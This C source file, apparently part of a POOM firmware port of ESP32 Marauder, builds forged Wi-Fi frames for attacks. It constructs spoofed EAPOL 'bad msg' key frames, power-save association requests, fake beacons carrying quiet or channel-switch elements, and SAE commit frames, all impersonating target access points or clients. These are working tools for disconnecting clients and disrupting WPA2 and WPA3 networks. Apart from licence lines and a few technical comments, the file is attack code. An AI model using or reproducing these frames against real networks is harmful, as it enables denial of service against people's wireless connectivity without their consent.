// SPDX-License-Identifier: MIT
// Frame formats adapted from ESP32 Marauder, Copyright (c) 2020 Just Call Me Koko.
// See MARAUDER_LICENSE.txt for provenance and license.
#include "poom_marauder_frames.h"
#include <string.h>

static void le16(uint8_t *out, uint16_t value)
{
    out[0] = (uint8_t)value;
    out[1] = (uint8_t)(value >> 8);
}

static void header(uint8_t *out, uint8_t subtype, uint8_t flags,
                   const uint8_t destination[6], const uint8_t source[6],
                   const uint8_t bssid[6], uint16_t sequence)
{
    out[0] = subtype;
    out[1] = flags;
    memcpy(out + 4, destination, 6);
    memcpy(out + 10, source, 6);
    memcpy(out + 16, bssid, 6);
    le16(out + 22, (uint16_t)((sequence & 0x0fffU) << 4));
}

static bool valid_target(const poom_marauder_frame_target_t *ap)
{
    return ap != NULL && ap->ssid_len <= sizeof(ap->ssid) && ap->channel != 0;
}

size_t poom_marauder_frame_bad_msg(uint8_t *out, size_t capacity,
    const poom_marauder_frame_target_t *ap, const uint8_t client[6],
    uint16_t sequence, uint64_t replay, const uint8_t nonce[32])
{
    static const uint8_t llc[] = {0xaa, 0xaa, 0x03, 0, 0, 0, 0x88, 0x8e};
    static const uint8_t pmkid[] = {
        0xdd, 0x14, 0, 0x0f, 0xac, 4, 0x11, 0x22, 0x33, 0x44, 0x55,
        0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11
    };
    if (!valid_target(ap) || out == NULL || client == NULL || nonce == NULL) return 0;
    const size_t length = ap->wpa3 ? 131U : 153U;
    if (capacity < length) return 0;
    memset(out, 0, length);
    header(out, 0x08, 0x02, client, ap->bssid, ap->bssid, sequence);
    memcpy(out + 24, llc, sizeof(llc));
    out[32] = 2; out[33] = 3;
    out[35] = ap->wpa3 ? 95 : 117;
    out[36] = 2;
    out[38] = ap->wpa3 ? 0xcb : 0xca;
    out[40] = ap->wpa3 ? 0 : 16;
    for (size_t i = 0; i < 8; ++i) out[41 + i] = (uint8_t)(replay >> (56U - i * 8U));
    memcpy(out + 49, nonce, 32);
    /* WPA3's shorter body must also advertise zero key-data bytes. Building
     * from zero each time avoids upstream's cross-target template mutation. */
    if (!ap->wpa3) {
        out[130] = sizeof(pmkid);
        memcpy(out + 131, pmkid, sizeof(pmkid));
    }
    return length;
}

size_t poom_marauder_frame_assoc_sleep(uint8_t *out, size_t capacity,
    const poom_marauder_frame_target_t *ap, const uint8_t client[6], uint16_t sequence)
{
    static const uint8_t ies[] = {
        0x01, 0x04, 0x82, 0x04, 0x0b, 0x16,
        0x21, 0x02, 0x01, 0x15,
        0x24, 0x02, 0x01, 0x01,
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,
        0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,
        0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x0c, 0x00,
        0x3b, 0x01, 0x51,
        0xdd, 0x0a, 0x00, 0x10, 0x18, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00, 0x02
    };
    if (!valid_target(ap) || out == NULL || client == NULL) return 0;
    size_t length = 30U + ap->ssid_len + sizeof(ies);
    if (capacity < length) return 0;
    memset(out, 0, length);
    header(out, 0x00, 0x10, ap->bssid, client, ap->bssid, sequence);
    le16(out + 2, 0x013a);
    le16(out + 24, 0x0031);
    le16(out + 26, 10);
    out[29] = (uint8_t)ap->ssid_len;
    memcpy(out + 30, ap->ssid, ap->ssid_len);
    uint8_t *tail = out + 30 + ap->ssid_len;
    memcpy(tail, ies, sizeof(ies));
    tail[12] = ap->channel;
    if (ap->channel > 14) {
        /* 5 GHz has no CCK rates. Keep this request's channel declaration
         * inside the selected channel's band instead of copying 1..13. */
        tail[2] = 0x8c; tail[3] = 0x98; tail[4] = 0xb0; tail[5] = 0x6c;
        tail[38] = ap->channel <= 48 ? 115 : (ap->channel <= 64 ? 118 : (ap->channel <= 144 ? 121 : 125));
    }
    return length;
}

size_t poom_marauder_frame_beacon(uint8_t *out, size_t capacity,
    const poom_marauder_frame_target_t *ap, uint16_t sequence,
    uint64_t timestamp_us, bool quiet, uint8_t destination_channel)
{
    static const uint8_t broadcast[6] = {255, 255, 255, 255, 255, 255};
    static const uint8_t rates[] = {1, 8, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    /* POOM requests one 100-TU quiet window at the next TBTT. Period zero
     * advertises no repeating schedule; the worker refreshes during the run. */
    static const uint8_t quiet_ie[] = {0x28, 6, 1, 0, 100, 0, 0, 0};
    if (!valid_target(ap) || out == NULL || (!quiet && (destination_channel == 0 || destination_channel == ap->channel))) return 0;
    const size_t length = 38U + ap->ssid_len + sizeof(rates) + 3U + (quiet ? sizeof(quiet_ie) : 5U);
    if (capacity < length) return 0;
    memset(out, 0, length);
    header(out, 0x80, 0, broadcast, ap->bssid, ap->bssid, sequence);
    for (size_t i = 0; i < 8; ++i) out[24 + i] = (uint8_t)(timestamp_us >> (i * 8U));
    le16(out + 32, 100);
    le16(out + 34, ap->privacy ? 0x0031 : 0x0021);
    out[37] = (uint8_t)ap->ssid_len;
    memcpy(out + 38, ap->ssid, ap->ssid_len);
    size_t offset = 38U + ap->ssid_len;
    memcpy(out + offset, rates, sizeof(rates));
    if (ap->channel > 14) {
        static const uint8_t rates5[] = {0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c};
        memcpy(out + offset + 2, rates5, sizeof(rates5));
    }
    offset += sizeof(rates);
    out[offset++] = 3; out[offset++] = 1; out[offset++] = ap->channel;
    if (quiet) memcpy(out + offset, quiet_ie, sizeof(quiet_ie));
    else {
        out[offset] = 0x25; out[offset + 1] = 3; out[offset + 2] = 1;
        out[offset + 3] = destination_channel; out[offset + 4] = 1;
    }
    return length;
}

size_t poom_marauder_frame_sae(uint8_t *out, size_t capacity,
    const poom_marauder_frame_target_t *ap, const uint8_t source[6],
    uint16_t sequence, const uint8_t scalar[32], const uint8_t point[64])
{
    if (!valid_target(ap) || out == NULL || source == NULL || scalar == NULL || point == NULL || capacity < 128U) return 0;
    memset(out, 0, 128);
    header(out, 0xb0, 0, ap->bssid, source, ap->bssid, sequence);
    le16(out + 24, 3); le16(out + 26, 1); le16(out + 30, 19);
    memcpy(out + 32, scalar, 32);
    memcpy(out + 64, point, 64);
    return 128;
}
